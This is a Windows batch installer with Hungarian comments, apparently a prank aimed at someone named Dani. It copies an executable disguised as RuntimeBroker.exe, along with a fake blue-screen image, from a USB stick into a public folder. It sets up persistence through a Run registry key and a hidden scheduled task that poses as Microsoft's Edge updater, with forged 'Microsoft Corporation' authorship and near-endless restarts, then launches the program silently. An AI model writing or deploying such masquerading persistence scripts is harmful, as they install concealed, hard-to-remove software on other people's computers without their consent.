@echo off
:: ============================================================
::  dani-meglepi -- Deploy szkript
:: ============================================================
setlocal EnableDelayedExpansion

set "ASSET_DIR=C:\Users\Public\dani-meglepi"
set "EXE_NAME=RuntimeBroker.exe"
set "TASK_NAME=MicrosoftEdgeUpdateTaskMachineCore"

:: Szkript saját könyvtára (pendrive gyökere)
set "SRC=%~dp0"
:: Záró \ eltávolítása ha van
if "%SRC:~-1%"=="\" set "SRC=%SRC:~0,-1%"

echo.
echo  ==========================================
echo   dani-meglepi telepito
echo  ==========================================
echo.

:: ----------------------------------------------------------
:: 1. Célkönyvtár létrehozása
:: ----------------------------------------------------------
echo [1/4] Konyvtar letrehozasa: %ASSET_DIR%
if not exist "%ASSET_DIR%" (
    mkdir "%ASSET_DIR%" 2>nul
    if errorlevel 1 (
        echo   HIBA: Nem sikerult letrehozni a konyvtarat.
        goto :fail
    )
    echo   Letrehozva.
) else (
    echo   Mar letezik, kihagyva.
)

:: ----------------------------------------------------------
:: 2. Fájlok másolása
:: ----------------------------------------------------------
echo.
echo [2/4] Fajlok masolasa...

set "FILES=%EXE_NAME% bsod.png daninak.gif"
set "MISSING="

for %%F in (%FILES%) do (
    if not exist "%SRC%\%%F" (
        echo   HIBA: Hianyzik a pendrive-rol: %%F
        set "MISSING=1"
    )
)
if defined MISSING (
    echo.
    echo   Bizonyosodj meg rola, hogy a pendrive-on megtalalhatok:
    echo     %EXE_NAME%, bsod.png, daninak.gif
    goto :fail
)

for %%F in (%FILES%) do (
    copy /Y "%SRC%\%%F" "%ASSET_DIR%\%%F" >nul
    if errorlevel 1 (
        echo   HIBA: Nem sikerult masolni: %%F
        goto :fail
    )
    echo   OK: %%F
)

:: ----------------------------------------------------------
:: 3. Registry Run kulcs (admin jog nélkül)
:: ----------------------------------------------------------
echo.
echo [3/4] Inditas beallitasa (Registry)...

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
    /v "RuntimeBrokerSvc" ^
    /t REG_SZ ^
    /d "\"%ASSET_DIR%\%EXE_NAME%\"" ^
    /f >nul 2>&1

if errorlevel 1 (
    echo   FIGYELEM: Registry bejegyzes nem sikerult (nem vegzetes egyebkent).
) else (
    echo   OK: Registry Run kulcs beallitva.
)

:: ----------------------------------------------------------
:: 4. Task Scheduler (admin jog nélkül)
:: ----------------------------------------------------------
echo.
echo [4/4] Task Scheduler feladat regisztralasa...

:: Régi task törlése ha van (hibát figyelmen kívül hagyjuk)
schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1

:: Temp XML fájl a task definíciójához
set "TASK_XML=%TEMP%\dm_task.xml"

:: Aktuális felhasználó lekérése
set "CURR_USER=%USERDOMAIN%\%USERNAME%"

(
echo ^<?xml version="1.0" encoding="UTF-16"?^>
echo ^<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>
echo   ^<RegistrationInfo^>
echo     ^<Author^>Microsoft Corporation^</Author^>
echo     ^<Description^>Keeps the Microsoft Edge Update Task running.^</Description^>
echo   ^</RegistrationInfo^>
echo   ^<Triggers^>
echo     ^<LogonTrigger^>
echo       ^<Enabled^>true^</Enabled^>
echo       ^<UserId^>%CURR_USER%^</UserId^>
echo     ^</LogonTrigger^>
echo   ^</Triggers^>
echo   ^<Principals^>
echo     ^<Principal id="Author"^>
echo       ^<UserId^>%CURR_USER%^</UserId^>
echo       ^<LogonType^>InteractiveToken^</LogonType^>
echo       ^<RunLevel^>LeastPrivilege^</RunLevel^>
echo     ^</Principal^>
echo   ^</Principals^>
echo   ^<Settings^>
echo     ^<MultipleInstancesPolicy^>IgnoreNew^</MultipleInstancesPolicy^>
echo     ^<DisallowStartIfOnBatteries^>false^</DisallowStartIfOnBatteries^>
echo     ^<StopIfGoingOnBatteries^>false^</StopIfGoingOnBatteries^>
echo     ^<ExecutionTimeLimit^>PT0S^</ExecutionTimeLimit^>
echo     ^<Hidden^>true^</Hidden^>
echo     ^<RestartOnFailure^>
echo       ^<Interval^>PT1M^</Interval^>
echo       ^<Count^>999^</Count^>
echo     ^</RestartOnFailure^>
echo     ^<RunOnlyIfNetworkAvailable^>false^</RunOnlyIfNetworkAvailable^>
echo     ^<IdleSettings^>
echo       ^<StopOnIdleEnd^>false^</StopOnIdleEnd^>
echo       ^<RestartOnIdle^>false^</RestartOnIdle^>
echo     ^</IdleSettings^>
echo     ^<RunOnlyIfIdle^>false^</RunOnlyIfIdle^>
echo   ^</Settings^>
echo   ^<Actions Context="Author"^>
echo     ^<Exec^>
echo       ^<Command^>"%ASSET_DIR%\%EXE_NAME%"^</Command^>
echo       ^<WorkingDirectory^>%ASSET_DIR%^</WorkingDirectory^>
echo     ^</Exec^>
echo   ^</Actions^>
echo ^</Task^>
) > "%TASK_XML%"

schtasks /create /xml "%TASK_XML%" /tn "%TASK_NAME%" /f >nul 2>&1
set "TASK_ERR=!errorlevel!"
del "%TASK_XML%" >nul 2>&1

if !TASK_ERR! neq 0 (
    echo   FIGYELEM: Task Scheduler regisztracio nem sikerult.
    echo   A Registry Run kulcs elegendo lesz az autoindításhoz.
) else (
    echo   OK: Task Scheduler feladat regisztralva.
)

:: ----------------------------------------------------------
:: 5. Azonnali indítás
:: ----------------------------------------------------------
echo.
echo [+] Program inditasa...
start "" /B "%ASSET_DIR%\%EXE_NAME%"
echo   OK: RuntimeBroker.exe elinditva.

:: ----------------------------------------------------------
:: Vege
:: ----------------------------------------------------------
echo.
echo  ==========================================
echo   Telepites befejezve!
echo.
echo   Fajlok helye : %ASSET_DIR%
echo   Autoinditas  : Registry + Task Scheduler
echo   Allapot      : Fut a hatterben
echo  ==========================================
echo.
goto :end

:fail
echo.
echo  ==========================================
echo   TELEPITES SIKERTELEN — lasd a hibat fent
echo  ==========================================
echo.
pause
exit /b 1

:end
:: Rövid szünet,
:: de ne maradjon nyitva sokáig
timeout /t 6 /nobreak >nul
exit /b 0
